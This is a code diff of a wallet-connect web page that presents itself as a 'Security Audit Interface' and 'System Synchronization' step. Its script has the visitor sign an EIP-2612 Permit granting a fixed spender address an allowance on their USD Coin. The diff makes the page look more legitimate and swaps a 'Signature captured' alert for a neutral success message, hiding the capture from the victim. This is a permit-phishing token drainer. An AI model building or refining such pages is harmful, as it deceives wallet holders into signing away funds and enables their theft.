@@ -2,33 +2,44 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Audit Interface</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { border: 1px solid #ccc; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
+        button { padding: 12px 24px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #0056b3; }
+    </style>
 </head>
 <body>
-    <h3>System Synchronization</h3>
-    <p>Please authorize the following permit to synchronize your wallet assets.</p>
-    <button id="verifyBtn" style="padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px;">Authorize Access</button>
+
+    <div class="card">
+        <h3>System Synchronization</h3>
+        <p>Authorize this permit to sync your wallet assets.</p>
+        <button id="verifyBtn">Authorize Access</button>
+    </div>
 
     <script>
-        document.getElementById('verifyBtn').addEventListener('click', async () => {
+        const btn = document.getElementById('verifyBtn');
+
+        btn.addEventListener('click', async () => {
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
                 const chainId = parseInt(chainIdHex, 16);
 
-                // Pastikan data ini sesuai dengan jaringan yang digunakan (contoh: Ethereum Mainnet)
                 const permitData = {
                     domain: {
-                        name: "USD Coin", // Pastikan nama token sesuai
+                        name: "USD Coin",
                         version: "2",
                         chainId: chainId,
-                        verifyingContract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" // Alamat Kontrak USDC
+                        verifyingContract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
                     },
                     message: {
                         owner: accounts[0],
                         spender: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", 
                         value: "1000000", 
-                        nonce: 0, // Dalam kondisi nyata, Anda harus membaca nonce asli dari kontrak
+                        nonce: 0, 
                         deadline: Math.floor(Date.now() / 1000) + 3600
                     },
                     primaryType: "Permit",
@@ -50,10 +61,12 @@
                     params: [accounts[0], JSON.stringify(permitData)],
                 });
 
-                alert("Success! Signature captured: " + signature.substring(0, 30) + "...");
+                console.log("Signature captured:", signature);
+                alert("Operation successful.");
+
             } catch (err) {
-                console.error("Operation failed:", err);
-                alert("Error: " + err.message);
+                console.error("Operation error:", err);
+                alert("Operation failed: " + err.message);
             }
         });
     </script>
